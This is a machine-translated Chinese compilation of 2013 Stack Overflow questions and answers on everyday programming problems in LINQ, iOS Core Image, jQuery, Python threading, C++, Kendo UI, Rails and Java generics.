> ID：15750322
> 
> 赞同：0
> 
> 时间：2013-04-01T19:28:56.863
> 
> 标签：c#, sql-server, linq, tsql

TSQL

我有一个带有“Id”列的*Person*表，一个带有“Id”列的*CourtCase*表，以及一个带有“Id”和“isReleased”列 的*Bond表。**Person*可以有很多*CourtCase*记录，*CourtCase*可以有很多*Bond*记录。我只想计算具有属于该*案例*的所有*Bond记录的**Bond*列都是 ALL *isReleased = true*的 PersonID 。这意味着除非该案件的所有保证金都已释放，否则该案件不会被释放。

 **** * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:42:12.877

```
var Result = 
    Persons.Where(p=>p.Cases.All(q=>q.Bonds.All(w=>w.isReleased))).Count() 
```***

# iphone - 这会垂直翻转我的 CIImage 吗？

> ID：15750323
> 
> 赞同：3
> 
> 时间：2013-04-01T19:28:57.107
> 
> 标签：iphone, ios, xcode, core-image

我很沮丧。为什么这不会垂直翻转我的 CIImage？

```
recognizedImage = [recognizedImage imageByApplyingTransform:CGAffineTransformTranslate(CGAffineTransformMakeScale(1, -1), 0, recognizedImage.extent.size.height)]; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T20:17:20.917

不要忘记添加`CoreImage.framework`到您的项目中。

这对我有用：

```
// Load image
UIImage *u = [UIImage imageNamed:@"myimage"];
// Convert to CIImage
CIImage *c = [[CIImage alloc] initWithImage:u];
// Apply transform
c = [c imageByApplyingTransform:CGAffineTransformTranslate(CGAffineTransformMakeScale(1, -1), 0, c.extent.size.height)];

// Convert back to UIImage
CIContext *context = [CIContext contextWithOptions:nil];
u = [UIImage imageWithCGImage:[context createCGImage:c fromRect:c.extent]];

// Load the UIImage into the view
[self.imageView setImage:u]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-14T23:47:08.150

你试过把它分成两部分吗？

```
myImage = [myImage imageByApplyingTransform:CGAffineTransformMakeScale(1, -1)];
myImage = [myImage imageByApplyingTransform:CGAffineTransformMakeTranslation(0, extent.size.height)]; 
```

# silverlight - 将 Silverlight 5 DataGrid HyperlinkBut ton 的内容传递给函数

> ID：15750324
> 
> 赞同：0
> 
> 时间：2013-04-01T19:28:57.163
> 
> 标签：silverlight, button, methods, parameters, hyperlink

好的......我确实做了一些查找，也许我没有正确的关键字，所以如果之前在这个论坛上提出过这个问题，我提前道歉。

我正在尝试将有效超链接的文本值传递给后面的 .cs 代码中的方法。我可以很好地处理其他所有事情，只需要获取正确的格式以将 TranId 值传递到点击方法“linkGetPayload_Click”。我想我在绑定上遗漏了一些东西。这是 XAML：

```
<HyperlinkButton Content="{Binding TranId}" 
                 Click="lnkGetPayload_Click({Binding TranId})" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-22T15:29:41.490

我做了同样的事情，但使用 Tag 属性来保存 id。

```
 <HyperlinkButton Content="{Binding name}" Tag="{Binding id}" Click="EditApplication" />

        void EditApplication(object sender, RoutedEventArgs e)
        {
            HyperlinkButton hb = (HyperlinkButton) sender;
            Edit(hb.Tag); 
        } 
```

# javascript - 在coldfusion中使用js获取表单元素

> ID：15750326
> 
> 赞同：0
> 
> 时间：2013-04-01T19:29:21.897
> 
> 标签：javascript, jquery

我正在尝试获取表单的元素，以便以后使用它们来创建对函数的 ajax 调用。

详细地说，我有一个看起来像这样的表格：（只有我的大约 6 倍大）

```
<form>
<input type="text" name="name" id="name"/> <br />
<input type="text" name="email" id="email"/><br />
<input type="radio" name="gender" id="male" value="M"> Male<br /> 
<input type="radio" name="gender" id="female" value="F"> Female<br />

<input type="button" name="btn1" id="btn1" value="Set Variables" onClick="setSession();">
</form> 
```

我需要编写一个函数来显示表单元素的名称或 ID 及其值或数组中的至少一个数字，以便我知道 element[0] 等于我的名称表单变量。

我写了几个不同版本的函数，但我最终迷路了，甚至更加困惑，这就是我需要帮助的地方。

设置好变量后，我需要将它们用于我的 ajax 调用，看起来像这样：

```
$.ajax({
    url:'setSessions.cfc?method=setSession',
    method:"POST",
    data: {name: name,
           email: email,
           gender: gender}
}); 
```

它将调用 setSessions 组件来设置我的会话变量。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:31:34.247

# [jsFiddle 演示](http://jsfiddle.net/mohammadAdil/GeVcX/)

您可以像这样获取表单数据。

```
var formData = $('form').serialize();

$.ajax({
    url:'setSessions.cfc?method=setSession',
    method:"POST",
    data: formData
}); 
```

如果你想访问单个元素，你可以这样做，

```
 var name = $('#name').val();
  var email = $('#email').val(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-01T19:31:45.263

尝试使用 jquery 的序列化（或 serializeArray）方法：

```
form.serialize(); 
```

# python - 更新无限循环中使用的变量

> ID：15750332
> 
> 赞同：2
> 
> 时间：2013-04-01T19:29:39.333
> 
> 标签：python, infinite-loop, raspberry-pi, gpio

我正在使用 Raspberry pi 上的 GPIO 来驱动 4 位 7 段显示器。显示是多路复用的并`while True:`循环运行。

我希望能够提示用户输入一个新的 4 位数字来更新显示。我尝试使用线程，但更新显示的线程无法识别更改的变量。

这是我认为可行的示例：

```
number = "0000" #used in drive_display() but can be updated in prompt()

def drive_display():
  while True:
    changeDigit(number[0],Digit1)
    time.Sleep(0.006)
    changeDigit(number[1],Digit2)
    time.Sleep(0.006)
    changeDigit(number[2],Digit3)
    time.Sleep(0.006)
    changeDigit(number[3],Digit4)
    time.Sleep(0.006)

threading.Thread(target=drive_display).start()

def prompt():
  number = input("new 4 digit number: ") 
  prompt()

prompt() 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:35:31.187

您必须[`global`](http://docs.python.org/2/reference/simple_stmts.html#grammar-token-global_stmt)在线程函数中使用它才能工作：

```
def prompt():
  global number
  number = raw_input("new 4 digit number: ") 
  prompt() 
```

从文档中：

> 没有分配给全局变量是不可能的`global`

# c++ - 我不断收到 [链接器错误] 未定义的对 `binarytree::~binarytree()' 的引用

> ID：15750333
> 
> 赞同：0
> 
> 时间：2013-04-01T19:29:53.540
> 
> 标签：c++, binary-tree, destructor

```
#ifndef BINARYTREE_H
#define BINARYTREE_H
#include <iomanip>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cmath>

using namespace std;

class binarytree
{
      private:
      struct tree
      {
             int val;
             tree *left;
             tree *right;
      };
      tree *root;
      void insert(tree *&, tree *&);
      void display(tree *) const;
      void destroy(tree *);
    public:

        binarytree()
        {root = NULL;}
        ~binarytree()
        {destroy(root);}

        void insertnode(int);
        bool search(int);
        void display() const
        { display(root); }
};

#endif // BINARYTREE_H 
```

这是我的.h

这是我的.cpp

```
#include "binarytree.h" // class's header file
#include <iomanip>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cmath>

using namespace std;

void binarytree :: insertnode( int num)
{
     tree *newnode;

     newnode = new tree;
     newnode->val = num;
     newnode->left = newnode->right = NULL;
     insert(root, newnode);
     }

     void binarytree :: insert(tree *&Ptr, tree *&newnode)
     {
          if(Ptr == NULL)
                 Ptr = newnode;
                 else if( newnode->val < Ptr->val)
                 insert(Ptr->left, newnode);
                 else
                 insert(Ptr->right, newnode);
                 }

void binarytree :: destroy(tree *Ptr)
{
     if(Ptr)
     {
            if(Ptr->left)
            destroy(Ptr->left);

             if(Ptr->right)
            destroy(Ptr->right);

            delete Ptr;
            }
     } 
```

我认为这是一个析构函数错误，但我不明白为什么。如果有语法错误或什么我会觉得很傻，但我刚刚从一本书中复制了这个，所以我似乎没有遗漏任何东西。任何建议都会有所帮助。如果您需要任何澄清，请询问！

# php - 检查mysqli fetch是否为空

> ID：15750342
> 
> 赞同：0
> 
> 时间：2013-04-01T19:30:26.940
> 
> 标签：php, mysqli

是否有任何有效的方法来检查 mysqli 的 fetch 循环是否不会运行（因为查询返回一个空表）？

```
while ($sql->fetch()) {
  // ... something
}

if (sql fetch returned empty array) {
  // ...
}
else {
  // ...
} 
```

我应该自己实现这个还是mysqli有任何预先制定的声明来做到这一点？

# javascript - 混合回调函数队列和 jQuery 延迟

> ID：15750343
> 
> 赞同：0
> 
> 时间：2013-04-01T19:30:31.917
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-autocomplete, jquery-deferred

我正在尝试创建一个要调用的函数队列以返回自动完成结果。其中一些是我通过 $.getJSON 调用自己构建的函数，而另一些是由外部开发人员使用[为 jQuery UI autocomplete 指定的内容](http://api.jqueryui.com/autocomplete/#option-source)提供给我的。

例如，这里提供了一个假的。我不知道它是否真正异步或何时可能调用回调：

```
var providedFunction = function(search, response) {
    setTimeout(function() {
        var arr = ['One', 'Two', 'Demo Custom'];
        response($.grep(arr, function (s) { return s.indexOf(search) === 0; }));
    },5000);
}; 
```

然后我想将它与其他一些 $.getJSON 调用结合起来，直到整个列表完成后才继续：

```
var searchTerm = "Demo";
var allResults = [];
var functionQueue = [];

functionQueue.push(
    $.getJSON( 'http://ws.geonames.org/searchJSON?featureClass=P&style=short&maxRows=50&name_startsWith=' + searchTerm)
    .success( function(data) {
        $.each(data.geonames, function(i,d) { 
            allResults.push(d.name); });
    })
);

functionQueue.push(
    providedFunction(searchTerm, function(data) {
        allResults.push.apply(allResults, data);
    })
);

// wait for all asyc functions to have added their results,
$.when.apply($, functionQueue).done(function() {
    console.log(allResults.length, allResults);
}); 
```

问题是 $.when 不等待提供的功能完成。它会在所有 $.getJSON 调用完成后立即返回。很明显，我没有正确连接提供的功能，但我不知道该怎么做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:29:33.550

如果你决定使用 $.when，你会想要创建一个 deferreds 数组，所以你可以像这样调用提供的函数：

```
functionQueue.push( (function(){
        var df = new $.Deferred();
        providedFunction(searchTerm, function(data) {
            allResults.push.apply(allResults, data);
            df.resolve();
        })
        return df;
    })()
); 
```

当然，如果你真的很喜欢，你可以使用这个方便的实用程序将基于回调的 API 转换为基于承诺/延迟的 API：

```
function castAPItoDeferred(origFunction){
    return function(){
        var df = new $.Deferred(),
            args = Array.prototype.slice.call(arguments, 0);
        // assume that the API assumes the last arg is the callback
        args.push(function(result){
            df.resolve(result);
        });
        try {
            origFunction.apply(null, args);
        } catch(e) {
           df.reject(e);
        }
        return df;
    }
} 
```

这将允许你做这样的好事：

```
providedFunctionAsDeferred = castAPItoDeferred(providedFunction);

functionQueue.push(
    providedFunctionAsDeferred(searchTerm)
    .success( function(data) {
        allResults.push.apply(allResults, data);
    })
); 
```

最后一个警告 - 如果您确实走第二条路线，请记住如果在对象上调用 API 函数（如`myApi.doSomeAsyncThing`） ，请连接/绑定您的 API 函数

最后，使用 $.when 的替代方法是手动跟踪事物，可能使用计数器。例如：

```
var counter = 2; // set your number of ops here

var checkIfFinished = function(){
    if(--counter === 0) {
        triggerAllEventsCompleteFunc(); // replace this with your desired action
    }
}

// call checkIfFinished in all your callbacks 
```

# opengl-es - GL_Positions 的 vec4 的 w 值代表什么？

> ID：15750345
> 
> 赞同：1
> 
> 时间：2013-04-01T19:30:38.777
> 
> 标签：opengl-es, glsl

编写一些 GLSL 并注意到当我重新调整 ax,y,z 坐标时，我的顶点着色器中的返回值是 vec4。我不相信它是阿尔法，在网上阅读它与剪辑有关吗？

# jquery - 文字动画暂停并继续

> ID：15750346
> 
> 赞同：-2
> 
> 时间：2013-04-01T19:30:38.480
> 
> 标签：jquery

所以下面的代码是我用来让文本同时从左右滑入的代码。不幸的是，我无法在第一个动画完成后暂停它。在第一组动画之后我需要延迟。

我尝试了延迟、setTimeout 和 setInterval 函数，但似乎没有任何效果（感谢@evan 的想法）。有谁知道我怎么能做到这一点？

这是以下代码的示例：[jsfiddle example](http://jsfiddle.net/xPXqV/1/)

```
$(function() {

    var num = 0;
    var wordTrue = true;
    var words = [
        {left: "SLAM", right: "FACE"},
        {left: "BOOST", right: "JAMZ"}
     ];   

    var fadel = $('#fadel');
    var fader = $('#fader');

    animate();

    function animate() {
        var leftword = words[num].left;
        var rightword = words[num].right;

        var first = leftword.slice(0, leftword.indexOf(" "));

        first = "<span class=\"g h\">" + first + "</span>";

        var lastWords = leftword.substring(leftword.indexOf(" ") + 1);

        var finalString = first + lastWords;

    fadel
        .stop()
        .css('top', '18px')
        .css('left', '0')
        .css('opacity', 0)
        .text(leftword).show();

    fader
        .stop()
        .css('top', '68px')
        .css('left', '400px')
        .css('opacity', 0)
        .text(rightword).show();

    fadel.animate({
        opacity: 1,
        left: '150px'
        }, 2700, function() {
            fadel.fadeOut("fast", function() {
            queueNext().delay(5000);
        });
    });

    fader.animate({
        opacity: 1,
        left: '250px'
    }, 2700, function() {  
            fader.fadeOut("fast");
        });
    }

    function queueNext() {
        if (++num == words.length)
        num = 0;

        animate();
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T20:51:33.337

[`setTimeout`](https://developer.mozilla.org/en-US/docs/DOM/window.setTimeout)在你的`queueNext`函数中使用。

```
function queueNext()
{
    if (++num == words.length)
        num = 0;
    setTimeout(animate, 3000); //delay duration (in milliseconds)
} 
```

演示：http: [//jsfiddle.net/dirtyd77/xPXqV/2/](http://jsfiddle.net/dirtyd77/xPXqV/2/)

# c++ - 指针数据字段的访问器函数

> ID：15750349
> 
> 赞同：1
> 
> 时间：2013-04-01T19:30:43.583
> 
> 标签：c++

我正在尝试为我创建的“团队”类中的数据字段创建一个访问器函数。每个团队成员都有一个指向另一个团队成员的指针数据字段，称为“合作伙伴”。有了getter，我想返回团队成员伙伴的地址。

数据字段 Partner 定义为：

```
Team *partner; 
```

我在标题中定义了如下函数：

```
Team getPartner(); 
```

这是我到目前为止尝试过的访问器功能：

```
Team Team::getPartner()
{
    return *partner;
} 
```

这是我试图在主函数中使用的语法（每个团队成员都是作为指针创建的；Harry 是为其设置合作伙伴的对象之一的名称）

```
cout << Harry->getPartner() << endl; 
```

这个指向另一个对象的指针的访问器函数是我的代码中唯一不起作用的部分。不幸的是，我不明白我的编译器给我的错误信息。我将不胜感激任何建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:37:47.577

如果你想返回伙伴的地址，那么在你的函数返回类型中这样说

```
Team* getPartner(); 
```

...

```
Team* Team::getPartner()
{
    return partner;
} 
```

或者，您可以返回对合作伙伴的引用

```
Team& Team::GetPartner()
{
     return *partner;
} 
```

但为了

```
cout << Harry->GetPartner(); 
```

您必须告诉编译器您希望它如何理解 << 对于 Teams。

```
ostream& operator << (ostream& o, const Team& team)  
{ 
    return o << team.name << team.somethingelse;
} 
```

# matlab - 在 MATLAB 中解析文本文件

> ID：15750351
> 
> 赞同：3
> 
> 时间：2013-04-01T19:30:46.137
> 
> 标签：matlab, parsing, matlab-guide

如何在 MATLAB 中解析文件？文本中的数据格式如下：

```
p
15.01245  20.478
12.589  58.256
n
16.589  87.268
52.367  46.256
2.589  58.02 
```

我想将每个数据存储在***单独的数组***中（*即*；将数据存储在数组 1 中的字母 p 下，并将数据存储在数组 2 中的字母 n 下）。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:59:00.170

您可以通过使用`fgets`to 逐行读取文件并检查包含`p`和的行来做到这一点`n`。

```
fid = fopen('pn.txt'); % open the file
i2 = 1;
data = {};
while ~feof(fid) % loop over the following until the end of the file is reached.
      line = fgets(fid); % read in one line
      if strfind(line,'p') % if that line contains 'p', set the first index to 1
          i1 = 1;
      elseif strfind(line,'n') % if that line contains 'n' set the first index to 2
          i1 = 2;
      else
          data{i1,i2} =  str2num(line); % otherwise, it the line contains numbers, add them to a cell array.
          i2 = i2 + 1;
      end
end
fclose(fid);

%convert the cell array into two matrices.
p = cell2mat(data(1,:));
p = reshape(p,[numel(p)/2,2])
n = cell2mat(data(2,:));
n = reshape(n,[numel(n)/2,2]) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-01T20:19:27.257

这是另一个解决方案：

```
fstring = fileread('test.txt'); % read the file as one string
fblocks = regexp(fstring,'[A-Za-z]','split'); % uses any single character as a separator
fblocks(1) = []; % removes anything before the first character
out = cell(size(fblocks));
for k = 1:numel(fblocks)
    out{k} = textscan(fblocks{k},'%f %f','delimiter',' ','MultipleDelimsAsOne', 1);
    out{k} = horzcat(out{k}{:});
end 
```

# delphi - 当 Focused 属性始终返回 False 时，如何确定 TCustomControl 是否聚焦？

> ID：15750352
> 
> 赞同：0
> 
> 时间：2013-04-01T19:30:47.200
> 
> 标签：delphi, focus, controls

我们正在使用修改后的`TToolWindow97 = class(TCustomControl)`组件。

![在此处输入图像描述](https://i.stack.imgur.com/dPlZd.png)

我只能找到它`TForm.Components`。并且没有它`TForm.Controls`。所以, `TForm.ActiveControl`is nil 和`TToolWindow97.Focused = False`when`TToolWindow97`是专注的。我需要知道它什么时候集中。

我还试图在`TToolWindow97`. 但他们都回来了`Focused = False`。

当属性总是返回时，如何确定`TToolWindow97`（继承自`TCustomControl`）是否集中？`Focused``False`

PS`TToolWindow97`窗口在图像上有阴影。只有聚焦`TToolWindow97`的窗口才有它 - 所以焦点存在。我可以将任何控制集中在它上面。但他们都回来了`Focused = False`。我不知道为什么。

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T20:41:19.937

工具栏按钮没有焦点。在图像中，很明显网格控件具有焦点——它有一个虚线焦点矩形，并且单元格以焦点颜色突出显示。

用鼠标*指向*带有阴影图像的“15”按钮。它处于“悬停”或“热”状态，而不是“焦点”状态。代码中状态名称为`bsMouseIn`，存储在`FState`字段中；该字段具有受保护的可见性，并且不会通过任何公共属性或方法公开。您可能对`OnMouseEnter`和`OnMouseExit`事件感兴趣。

工具栏按钮很少获得焦点。它们只能用鼠标操作。要使用键盘操作它们，您应该按下它们关联的快捷键组合。特定的按钮控件`TToolbarButton97`绝对不会获得焦点，因为它来自`TGraphicControl`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T15:03:33.343

1）。当 TBToolWindow 获得焦点而不是焦点时扫描以下句柄：

```
 aHandle := (Sender as TForm).Handle;
        aHandle := aVisible.Handle;
        aHandle := GetForegroundWindow;
        aHandle := GetActiveWindow;
        aHandle := Screen.ActiveForm.Handle;
        aHandle := Application.ActiveFormHandle; 
```

因此，区别仅在于 Screen.ActiveForm.Handle。

2）。安装微软间谍。

3）。将 Screen.ActiveForm.Handle 转换为 HEX 并在 Spy 上找到它们。

4）。看课。因此，当 TTBToolWindow 聚焦时，aHandle 的类是 TBFloatingWindowParent。

5）。编写代码通过 TBFloatingWindowParent 控件寻找正确的活动浮动窗口（TTBToolWindow）。

# android - 以纵向模式强制应用。（包括硬件键盘）

> ID：15750353
> 
> 赞同：0
> 
> 时间：2013-04-01T19:30:48.027
> 
> 标签：android, launcher, portrait

我正在尝试修改启动器以强制它处于纵向模式。我在活动中添加了 android:screenOrientation="portrait" android:configChanges="keyboardHidden|orientation

但问题仍然是硬件键盘，它强制它进入横向模式。即使打开硬件键盘，如何将启动器锁定为纵向模式。

# curl - 尝试指定查询参数 (q) 可以使用 SDK，但从 cURL 返回 401 未授权

> ID：15750354
> 
> 赞同：0
> 
> 时间：2013-04-01T19:30:50.180
> 
> 标签：curl, soundcloud

我正在尝试对 SoundCloud API 进行搜索查询。

使用他们的 JavaScript SDK，以下工作：

```
SC.get('/tracks', { q: 'punk' }, function(tracks) {
  console.log(tracks);
}); 
```

但是，如果我尝试使用 cURL 执行相同的查询：

```
curl -v http://api.soundcloud.com/tracks?q=punk&client_id=xxxx 
```

它说`<error>401 - Unauthorized</error>`

如果我更改查询参数的顺序，`http://api.soundcloud.com/tracks?client_id=xxxx&q=punk`它将忽略`q`参数并以默认曲目列表响应。

从 cURL 查询轨道端点的正确方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T22:03:13.850

您使用的 URL 没有任何错误，因此如果您收到 401，那是因为您使用了无效的客户端 ID。请仔细检查客户端 ID 是否与您在初始化 JavaScript SDK 时使用的相同。

例如，以下使用我的一个测试应用程序的客户端 ID 就可以正常工作：

`curl "https://api.soundcloud.com/tracks?q=track&client_id=aeb03ac55f278fc7e579c744144b1d5d`

查询字符串中参数的顺序对响应没有影响。

# kendo-ui - 剑道 UI 多选

> ID：15750356
> 
> 赞同：5
> 
> 时间：2013-04-01T19:31:01.700
> 
> 标签：kendo-ui

我一直在使用带有服务器端过滤的新 Kendo UI Multiselect 小部件，但我无法让它只在输入最少数量的字符后才进行 ajax 调用。我已将 autoBind 和 minLength 选项分别设置为 false 和 3。但是，只要我将光标放在文本字段中，它就会发送一个 ajax 请求以获取选择选项。在发送另一个 ajax 请求并刷新选项列表之前，它确实会等到输入 3 个字符（或更多）。但是如何让它等到输入 3 个字符后才发送第一个 ajax 请求？这是我配置多选的方式：

```
 $('#delegates').kendoMultiSelect(
        {
            autoBind: false,
            minLength: 3,
            placeholder: 'Select delegates...',
            dataTextField: 'name',
            dataValueField: 'personid',
            filter: 'contains',
            delay: 200,
            dataSource: {
                serverFiltering: true,
                transport: {
                    read: {
                        url: '/my/remote/url',
                        dataType: 'json'
                    }
                }
            }
        }
    ); 
```

我已经查看了 KendoUI 站点上 MultiSelect 小部件的[概述](http://docs.kendoui.com/getting-started/web/multiselect/overview)和[API 文档](http://docs.kendoui.com/api/web/multiselect)，它甚至没有出现我所说的方法（我最初认为 autoBind: false 和 minLength: 3 会是我的答案，但事实证明不是）。所以我发帖是希望我可能错过了一些东西。在此先感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-21T05:25:55.167

```
$("#products").kendoMultiSelect({
                        placeholder: "Select products...",
                        dataTextField: "name",
                        dataValueField: "id",
                        autoBind: false,
                        dataSource: {
                            transport:{
                                read:{
                                    url:'products/api/get',
                                    serverPaging:true,
                                    pageSize:20,
                                    contentType:'application/json; charset=utf-8',
                                    type:'GET',
                                    dataType:'json'
                                }
                            }
                        }
                    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T07:09:49.793

我会选择解决方法。

如果我在这里查看 KendoUI 演示：[Server Filtering Demo](http://demos.kendoui.com/web/multiselect/serverfiltering.html) with FireBug，页面加载后会立即进行初始调用。我认为这是设计使然，并且在当前版本的小部件中是预期的。

由于这是一个新的小部件，请尝试联系剑道团队。运气好的话，在下一个版本（或介于两者之间的某个测试版）中，将有一个选项。

# facebook-comments - 更改谷歌搜索结果中 facebook 页面的描述

> ID：15750357
> 
> 赞同：0
> 
> 时间：2013-04-01T19:31:04.877
> 
> 标签：facebook-comments

谷歌搜索：“*公司名称*facebook”

搜索结果中的描述：（*从 facebook 页面内容中检索到的不满意客户的评论，而不是 facebook 页面元描述*）。

可以更改此 Google 搜索结果说明吗？

当我说“搜索结果中的描述”时，我指的是这张图片中带有红色箭头的文字： ![](https://i.stack.imgur.com/TrqwK.png)

谷歌正在使用 Facebook 用户的评论作为“*公司名称*facebook”搜索结果中的描述。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-04T22:05:50.007

根据此页面： http: [//support.aarcadethemes.com/how-do-i-update-or-change-the-google-search-results-for-my-site/](http://support.aarcadethemes.com/how-do-i-update-or-change-the-google-search-results-for-my-site/)

```
The description of your search result is generated by an automated Google process
that takes into account both the content of the page, the page description meta
tag in the head of your page code and references to the page that appear on the
web. While the description of your search result is often the same as the page
description meta tag content, this is not always the case and is by no means
guaranteed. 
```

这里的想法是在`<head></head>`. 最有可能的候选者可能是`<title>`标签（正如这个答案所暗示的：[http](http://answers.yahoo.com/question/index?qid=20100415072702AAfrSVH) ://answers.yahoo.com/question/index?qid=20100415072702AAfrSVH ）

您还应该能够使用`<meta name="description" content="This is an example of a meta description. This will often show up in search results.">`来帮助更改 Google 显示的内容。

您的主要问题似乎是 Google 搜索最近开始使用评论作为潜在结果： http: [//losangeles.cbslocal.com/2011/11/03/google-to-index-facebook-comments-as-search-results/](http://losangeles.cbslocal.com/2011/11/03/google-to-index-facebook-comments-as-search-results/)

为此，您可能会发现此信息信息丰富（[来源](http://www.facebook.com/help/392235220834308/)）：

```
When people post to an open forum on the site (ex: on Pages, in open groups or
in the Community Forum section of the Help Center) the posts may also appear
in search results from search engines like Yahoo and Google.

Facebook does not have control over content that's already been indexed and
cached by search engines. If you want to remove a piece of content that
you've shared publicly from an internet search engine, you can:

Delete the original post. When you do this, the content may still show up
in search engines, but the link to that content will be invalid.
Contact the specific search engine’s support team. If you want the entire
search result to go away, please reach out to the search engine to remove it. 
```

我认为您的选择是：

*   尝试让有问题的评论者更改/删除他们的评论
*   联系谷歌： https: [//support.google.com/websearch/](https://support.google.com/websearch/)
*   尝试更改页面的标题内容
*   尝试获取不同的评论以成为描述

如果您可以提供您正在搜索的文字字符串（在本例中为公司名称），我们可能会提供进一步的帮助。如果您在实施解决方案时遇到技术问题，请随时提出新问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-12T06:09:57.957

我不知道我们是否进行了任何更改以触发 Google 显示不同的描述，但令人高兴的是，Google 搜索我雇主的 Facebook 页面现在显示了我们 Facebook 设置中“关于”页面的“任务”部分。该使命宣言也在我们 Facebook 页面的元描述和 og:description 中。

如果其他人遇到此问题，请尝试在 Facebook 设置的“关于”下添加使命陈述。（设置中有一个实际的表单文本框，标记为任务。这不是自定义字段或一些时髦的关键字匹配的东西，只是 Facebook 设置的“关于”部分中的一个输入框。）

# ruby-on-rails - 如何为嵌套字段编号？

> ID：15750358
> 
> 赞同：0
> 
> 时间：2013-04-01T19:31:10.457
> 
> 标签：ruby-on-rails, nested-forms

我正在构建具有`has_many`,`belongs_to`关系的嵌套字段，如下所示：

`app/controllers/widgets_controller.rb`

```
def new
  @widget = Widget.new
  3.times { @widget.gizmos.build }
end 
```

* * *

`app/views/widgets/_form.html.erb`

```
<%= form_for @widget do |f| %>
  ...
  <%= f.fields_for :gizmos do |b| %>
    <%= render 'gizmo_fields', f: b %>
  <% end -%>
  ...
<% end -%> 
```

* * *

`app/views/widgets/_gizmo_fields.html.erb`

```
<%= f.label :name "Gizmo -NUMBER-" %>
<%= f.text_field :name %> 
```

* * *

如何以编程方式`gizmo`确定`widget.gizmos`. 这样每个输出看起来像：

```
Gizmo 1 |_____text_____|
Gizmo 2 |_____text_____|
Gizmo 3 |_____text_____| 
```

我想避免的：

*   **使用 Javascript** - 我知道我可以用 vanilla javascript 或 jquery 对这些进行编号。我想要一个纯粹的 ruby​​/rails 解决方案，这样不仅代码更容易理解，而且我希望更多地了解嵌套字段。
*   **增加变量**- 同样，我想更多地了解嵌套字段的上下文，看看是否有更动态和具体的方法来为嵌套字段编号。

我已经知道的：

*   `gizmo`我可以访问通过的当前实例`f.object`
*   我无法访问`f.object.widget`该`new`操作，因为尚未保存记录

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:03:00.773

好吧，我想我已经接近了。我有所有的碎片，只需要把它们放在一起。因为我可以访问 formbuilder 的对象，所以我可以在它的关联数组中找到它的位置`@widget`

```
<%= f.fields_for :gizmos do |b| %>
  <%= render 'gizmo_fields', f: b, index: @widget.gizmos.index(b.object) + 1 %>
<% end -%> 
```

* * *

`app/views/widgets/_gizmo_fields.html.erb`

```
<%= f.label :name "Gizmo #{index}" %>
<%= f.text_field :name %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:36:22.110

我相信您的部分中有一个可用的变量是“PARTIAL_NAME_counter”，即

```
gizmo_fields_counter 
```

请参阅[http://databasically.com/2009/04/09/rails-render-partial-counters-displaying-a-records-index/](http://databasically.com/2009/04/09/rails-render-partial-counters-displaying-a-records-index/)

# c# - 剑道网格从模型属性更改列名？

> ID：15750369
> 
> 赞同：0
> 
> 时间：2013-04-01T19:31:46.660
> 
> 标签：c#, asp.net-mvc-3, kendo-ui, kendo-grid

如何更改为我的剑道网格列标题呈现的文本？是否可以使用属性标记我的模型来完成此操作？

```
public class ConfigProject
{

    public ConfigTeam Team                      { get; set; }

    [Description("Project Name")]
    public string Name                          { get; set; }

    [Description("Project Description")]
    public string Description                   { get; set; }

    public List<ConfigSetting>      Settings      { get; set; }
} 
```

所以说我想要项目名称和项目描述来呈现而不是名称和描述的属性名称......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:39:10.617

抱歉永远不会失败，在发布问题后不久就找到了。我正在寻找的属性称为显示名称。

```
 public class ConfigProject
{

    public ConfigTeam Team                      { get; set; }

    [DisplayName("Project Name")]
    public string Name                          { get; set; }

    [DisplayName("Project Description")]
    public string Description                   { get; set; }

    public List<ConfigSetting>      Settings      { get; set; }
} 
```

# java - 如何从超级列表中子集某些类对象的列表？

> ID：15750371
> 
> 赞同：0
> 
> 时间：2013-04-01T19:31:50.263
> 
> 标签：java, oop

我有一个`List<Base>`包含多个实现的所有对象，例如`Foo`or `Bar`。如何提取完整列表的子集以获取例如 all `Foo`s？

以下工作但非常难看（重复代码，类型转换等）。

```
class Base;
class Foo extends Base;
class Bar extends Base;

List<Base> bases;

List<Foo> getFoos() {
    List<Foo> foos = new ArrayLista<Foo>();
    for (Base base : bases) {   
        foos.add((Foo) base);
    }

    return foos;
}

List<Bar> getBars() {
    List<Bar> Bars = new ArrayLista<Bar>();
    for (Base base : bases) {   
        Bars.add((Bar) base);
    }

    return Bars;
} 
```

如何改进？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:38:34.903

试试这个，

```
private <T extends Base> List<T> getSubType(Class<T> type)
{
    List<T> list = new ArrayList<T>();
    for (Base b : bases)
    {
        if (b.getClass().isAssignableFrom(type))
        {
            list.add((T) b);
        }
    }

    return list;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T19:34:09.570

